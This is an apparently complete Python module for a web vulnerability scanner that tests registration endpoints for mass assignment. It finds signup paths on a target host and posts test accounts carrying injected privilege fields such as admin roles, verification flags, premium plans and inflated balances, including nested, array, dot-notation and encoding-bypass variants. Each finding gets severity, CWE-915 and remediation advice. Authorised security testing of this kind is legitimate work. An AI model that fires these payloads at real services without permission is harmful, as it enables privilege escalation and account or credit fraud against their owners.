"""Mass Assignment Scanner — enhanced JSON field injection for registration flows.

Inspired by LostSec's mass assignment guide.
Tests for hidden JSON fields that grant unauthorized privileges.
"""

from __future__ import annotations

import json
import re
from typing import List, Dict, Any, Optional
from urllib.parse import urlparse, urljoin

from .findings import Finding
from ..core.logger import logger
from ..core.ratelimit import get_limiter


# ---------------------------------------------------------------------------
# Privilege escalation payloads
# ---------------------------------------------------------------------------

PRIVILEGE_PAYLOADS: List[Dict[str, Any]] = [
    # Direct role/admin flags
    {"role": "admin"},
    {"role": "administrator"},
    {"role": "superadmin"},
    {"role": "root"},
    {"is_admin": True},
    {"is_admin": 1},
    {"is_admin": "true"},
    {"isAdmin": True},
    {"isAdmin": 1},
    {"admin": True},
    {"admin": 1},
    {"is_superuser": True},
    {"is_superuser": 1},
    {"is_staff": True},
    {"is_staff": 1},
    {"is_superadmin": True},

    # User type / access level
    {"user_type": "admin"},
    {"user_type": "administrator"},
    {"user_type": "staff"},
    {"user_type": "superuser"},
    {"type": "admin"},
    {"account_type": "admin"},
    {"access_level": 999},
    {"access_level": "admin"},
    {"level": 999},
    {"permission": "admin"},
    {"permissions": "all"},
    {"privilege": "admin"},
    {"privileges": ["admin", "superuser"]},

    # Verification / activation
    {"verified": True},
    {"verified": 1},
    {"email_verified": True},
    {"active": True},
    {"activated": True},
    {"approved": True},
    {"confirmed": True},
    {"status": "active"},
    {"account_status": "active"},

    # Plan / subscription
    {"plan": "premium"},
    {"plan": "enterprise"},
    {"subscription": "premium"},
    {"tier": "premium"},
    {"is_premium": True},
    {"is_pro": True},
    {"paid": True},

    # Credit / balance
    {"credit": 99999},
    {"balance": 99999},
    {"wallet_balance": 99999},
    {"points": 99999},
    {"credits": 99999},
]


class MassAssignmentScanner:
    """Tests for mass assignment vulnerabilities in API endpoints."""

    NAME = "mass_assignment"

    def __init__(self, rps: float = 5.0, timeout: float = 10.0):
        self.limiter = get_limiter(rps)
        self.timeout = timeout

    def scan_url(self, url: str, **kwargs) -> List[Finding]:
        """Scan URL for mass assignment vulnerabilities."""
        import httpx

        findings: List[Finding] = []
        parsed = urlparse(url)
        host = parsed.netloc

        client = httpx.Client(
            verify=True, timeout=self.timeout, follow_redirects=True,
            headers={
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Content-Type": "application/json",
                "Accept": "application/json",
            },
        )

        try:
            # Find registration/signup endpoints
            endpoints = self._discover_endpoints(client, url, host)

            # Also test the provided URL directly
            endpoints.append(url)

            for endpoint in endpoints:
                # Test 1: Simple field injection
                findings.extend(self._test_simple_injection(client, endpoint, host))

                # Test 2: Nested JSON injection
                findings.extend(self._test_nested_injection(client, endpoint, host))

                # Test 3: Array-based bypass
                findings.extend(self._test_array_bypass(client, endpoint, host))

                # Test 4: Dot notation injection
                findings.extend(self._test_dot_notation(client, endpoint, host))

                # Test 5: Unicode/encoding bypass
                findings.extend(self._test_encoding_bypass(client, endpoint, host))

        finally:
            client.close()

        logger.info(f"Mass assignment scan: {len(findings)} findings")
        return findings

    def _discover_endpoints(self, client, url: str, host: str) -> List[str]:
        """Find registration/signup endpoints."""
        endpoints = []
        parsed = urlparse(url)
        base = f"{parsed.scheme}://{parsed.netloc}"

        signup_paths = [
            "/api/register", "/api/signup", "/api/users", "/api/v1/users",
            "/api/v1/register", "/api/v1/signup", "/api/v2/users",
            "/register", "/signup", "/sign-up", "/create-account",
            "/api/auth/register", "/api/auth/signup",
            "/api/account", "/api/profile",
        ]

        for path in signup_paths:
            test_url = base + path
            self.limiter.wait(host)
            try:
                resp = client.get(test_url, follow_redirects=False)
                if resp.status_code in (200, 201, 405):  # 405 = Method Not Allowed (endpoint exists)
                    endpoints.append(test_url)
            except Exception:
                pass

        return endpoints

    def _test_simple_injection(self, client, url: str, host: str) -> List[Finding]:
        """Test simple privilege field injection."""
        findings = []

        base_payload = {
            "username": f"testuser_{hash(url) % 10000}",
            "email": f"test_{hash(url) % 10000}@example.com",
            "password": "TestPassword123!",
        }

        for extra in PRIVILEGE_PAYLOADS:
            field_name = list(extra.keys())[0]
            field_value = list(extra.values())[0]

            test_payload = {**base_payload, **extra}

            self.limiter.wait(host)
            try:
                resp = client.post(url, json=test_payload)
                result = self._check_assignment(resp, field_name, field_value)
                if result:
                    findings.append(Finding(
                        vuln_type="Mass Assignment",
                        title=f"Mass assignment: {field_name}={field_value}",
                        severity=self._severity_for_field(field_name),
                        url=url,
                        method="POST",
                        payload=json.dumps(extra),
                        evidence=result,
                        description=f"Registration endpoint accepts '{field_name}' field with value '{field_value}'.",
                        remediation="Use allowlists for accepted registration fields. Never map request body directly to user model.",
                        cvss=self._cvss_for_field(field_name),
                        cwe="CWE-915",
                        tool=self.NAME,
                        verified=True,
                        confidence="HIGH",
                        request=f"curl -k -X POST '{url}' -H 'Content-Type: application/json' -d '{json.dumps(test_payload)[:300]}'",
                    ))
            except Exception:
                pass

        return findings

    def _test_nested_injection(self, client, url: str, host: str) -> List[Finding]:
        """Test nested JSON field injection."""
        findings = []

        nested_payloads = [
            ({"user": {"role": "admin"}}, "Nested user.role"),
            ({"user": {"is_admin": True}}, "Nested user.is_admin"),
            ({"user": {"permissions": ["admin"]}}, "Nested user.permissions"),
            ({"account": {"type": "admin"}}, "Nested account.type"),
            ({"profile": {"role": "admin"}}, "Nested profile.role"),
            ({"data": {"is_admin": True}}, "Nested data.is_admin"),
            ({"metadata": {"role": "admin"}}, "Nested metadata.role"),
            ({"attributes": {"role": "admin"}}, "Nested attributes.role"),
        ]

        for payload, description in nested_payloads:
            self.limiter.wait(host)
            try:
                resp = client.post(url, json={
                    "username": f"testuser_{hash(url) % 10000}",
                    "email": f"test_{hash(url) % 10000}@example.com",
                    "password": "TestPassword123!",
                    **payload,
                })

                body = resp.text[:2000].lower()
                field_name = list(list(payload.values())[0].keys())[0] if isinstance(list(payload.values())[0], dict) else ""
                field_value = str(list(list(payload.values())[0].values())[0]) if isinstance(list(payload.values())[0], dict) else ""

                if resp.status_code in (200, 201):
                    if field_name in body or field_value.lower() in body:
                        findings.append(Finding(
                            vuln_type="Mass Assignment",
                            title=f"Mass assignment: {description}",
                            severity="HIGH",
                            url=url,
                            method="POST",
                            payload=json.dumps(payload),
                            evidence=f"Response contains '{field_name}' field value",
                            description=f"{description} — server accepts nested privilege fields.",
                            remediation="Flatten and validate nested JSON. Use strict schema validation.",
                            cvss=8.1,
                            cwe="CWE-915",
                            tool=self.NAME,
                            verified=True,
                            confidence="MEDIUM",
                        ))
            except Exception:
                pass

        return findings

    def _test_array_bypass(self, client, url: str, host: str) -> List[Finding]:
        """Test array-based privilege injection."""
        findings = []

        array_payloads = [
            ({"roles": ["user", "admin"]}, "Array roles with admin"),
            ({"permissions": ["read", "write", "admin"]}, "Array permissions with admin"),
            ({"groups": ["users", "administrators"]}, "Array groups with admin"),
            ({"scopes": ["read", "write", "admin"]}, "Array scopes with admin"),
        ]

        for payload, description in array_payloads:
            self.limiter.wait(host)
            try:
                resp = client.post(url, json={
                    "username": f"testuser_{hash(url) % 10000}",
                    "email": f"test_{hash(url) % 10000}@example.com",
                    "password": "TestPassword123!",
                    **payload,
                })

                if resp.status_code in (200, 201):
                    body = resp.text[:2000].lower()
                    if "admin" in body:
                        findings.append(Finding(
                            vuln_type="Mass Assignment",
                            title=f"Mass assignment: {description}",
                            severity="HIGH",
                            url=url,
                            method="POST",
                            payload=json.dumps(payload),
                            evidence=f"Response reflects admin role from array",
                            description=f"{description}. Server accepts array with elevated roles.",
                            remediation="Validate array contents against allowed values.",
                            cvss=8.1,
                            cwe="CWE-915",
                            tool=self.NAME,
                            verified=True,
                            confidence="MEDIUM",
                        ))
            except Exception:
                pass

        return findings

    def _test_dot_notation(self, client, url: str, host: str) -> List[Finding]:
        """Test dot-notation field injection."""
        findings = []

        dot_payloads = [
            ({"user.role": "admin"}, "Dot notation user.role"),
            ({"user.is_admin": True}, "Dot notation user.is_admin"),
            ({"account.type": "premium"}, "Dot notation account.type"),
        ]

        for payload, description in dot_payloads:
            self.limiter.wait(host)
            try:
                resp = client.post(url, json={
                    "username": f"testuser_{hash(url) % 10000}",
                    "email": f"test_{hash(url) % 10000}@example.com",
                    "password": "TestPassword123!",
                    **payload,
                })

                if resp.status_code in (200, 201):
                    field_name = list(payload.keys())[0]
                    field_value = str(list(payload.values())[0]).lower()
                    body = resp.text[:2000].lower()
                    if field_value in body or field_name.split(".")[-1] in body:
                        findings.append(Finding(
                            vuln_type="Mass Assignment",
                            title=f"Mass assignment: {description}",
                            severity="HIGH",
                            url=url,
                            method="POST",
                            payload=json.dumps(payload),
                            evidence=f"Response contains dot-notation field value",
                            description=f"{description}. Server processes dot-notation fields.",
                            remediation="Reject or flatten dot-notation keys in request body.",
                            cvss=7.5,
                            cwe="CWE-915",
                            tool=self.NAME,
                            verified=True,
                            confidence="MEDIUM",
                        ))
            except Exception:
                pass

        return findings

    def _test_encoding_bypass(self, client, url: str, host: str) -> List[Finding]:
        """Test encoding bypass for field names."""
        findings = []

        encoding_payloads = [
            ({"r\u006fle": "admin"}, "Unicode bypass for 'role'"),
            ({"role\x00": "admin"}, "Null byte suffix on 'role'"),
            ({"ROLE": "admin"}, "Uppercase field name"),
            ({"Role": "admin"}, "Mixed case field name"),
            ({"r o l e": "admin"}, "Space in field name"),
        ]

        for payload, description in encoding_payloads:
            self.limiter.wait(host)
            try:
                resp = client.post(url, json={
                    "username": f"testuser_{hash(url) % 10000}",
                    "email": f"test_{hash(url) % 10000}@example.com",
                    "password": "TestPassword123!",
                    **payload,
                })

                if resp.status_code in (200, 201):
                    body = resp.text[:2000].lower()
                    if "admin" in body:
                        findings.append(Finding(
                            vuln_type="Mass Assignment",
                            title=f"Mass assignment: {description}",
                            severity="MEDIUM",
                            url=url,
                            method="POST",
                            payload=json.dumps(payload),
                            evidence=f"Encoding bypass detected",
                            description=f"{description}. Server processes encoded field names.",
                            remediation="Normalize field names before validation.",
                            cvss=6.5,
                            cwe="CWE-915",
                            tool=self.NAME,
                            verified=True,
                            confidence="LOW",
                        ))
            except Exception:
                pass

        return findings

    def _check_assignment(self, resp, field_name: str, field_value: Any) -> Optional[str]:
        """Check if the field was assigned in the response."""
        if resp.status_code not in (200, 201):
            return None

        body = resp.text[:3000].lower()
        value_str = str(field_value).lower()

        # Direct reflection of the value
        if value_str in body and field_name.lower() in body:
            return f"Response reflects {field_name}={field_value}"

        # Check for success indicators
        if resp.status_code == 201:
            try:
                data = resp.json()
                if isinstance(data, dict):
                    # Check if field is in response
                    if field_name in data:
                        if str(data[field_name]).lower() == value_str:
                            return f"Response object contains {field_name}={field_value}"
                    # Check nested
                    for key in ["user", "data", "account", "profile"]:
                        if key in data and isinstance(data[key], dict):
                            if field_name in data[key]:
                                if str(data[key][field_name]).lower() == value_str:
                                    return f"Response.{key}.{field_name}={field_value}"
            except (json.JSONDecodeError, ValueError):
                pass

        return None

    def _severity_for_field(self, field_name: str) -> str:
        name_lower = field_name.lower()
        if any(kw in name_lower for kw in ["admin", "superuser", "staff", "root", "superadmin"]):
            return "CRITICAL"
        if any(kw in name_lower for kw in ["role", "permission", "privilege", "access"]):
            return "HIGH"
        if any(kw in name_lower for kw in ["verified", "active", "approved", "plan", "premium"]):
            return "HIGH"
        return "MEDIUM"

    def _cvss_for_field(self, field_name: str) -> float:
        sev = self._severity_for_field(field_name)
        return {"CRITICAL": 9.8, "HIGH": 8.1, "MEDIUM": 6.5}.get(sev, 5.3)


__all__ = ["MassAssignmentScanner"]
